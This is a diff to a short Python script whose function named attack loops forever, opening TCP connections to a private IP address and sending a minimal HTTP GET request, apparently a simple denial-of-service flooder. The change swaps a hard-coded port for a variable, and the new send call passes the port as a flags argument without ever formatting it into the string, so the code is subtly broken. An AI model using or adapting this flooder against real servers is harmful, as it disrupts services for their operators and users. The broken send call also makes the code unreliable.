@@ -1,15 +1,16 @@
 import threading
 import socket, sys, os
+port = 8000
 
 def attack():
     while True:
         # pid = os.fork()
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("10.77.70.71", 6000))
+            s.connect(("10.77.70.71", port))
             #print(">> GET / HTTP/1.1")
             s.send(b"GET / \r\n")
-            s.send(b"Host: http://10.77.70.71:5000 \r\n\r\n");
+            s.send(b"Host: http://10.77.70.71:%s \r\n\r\n", port);
             s.close()
         except (TimeoutError,ConnectionRefusedError,OSError):
             print('errored')
